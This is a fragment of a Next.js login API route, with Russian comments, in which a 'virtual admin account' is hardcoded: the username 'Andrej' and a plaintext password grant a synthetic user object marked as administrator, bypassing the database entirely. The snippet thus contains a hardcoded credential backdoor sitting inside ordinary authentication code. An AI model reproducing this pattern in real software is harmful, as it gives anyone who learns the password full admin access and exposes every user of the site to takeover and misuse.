...
export async function POST(request: NextRequest) {
  try {
    ...
    // === Виртуальный админ-аккаунт ===
    if (sanitizedUsername === "Andrej" && password === "14888841") {
      const adminUserData = {
        id: -1, // любое служебное значение, которого нет в БД
        username: "Andrej",
        is_admin: true,
        blocked: false,
        uid: "admin-Andrej",
      ...
      return NextResponse.json({ user: adminUserData })
    }
    // === /виртуальный админ-аккаунт ===
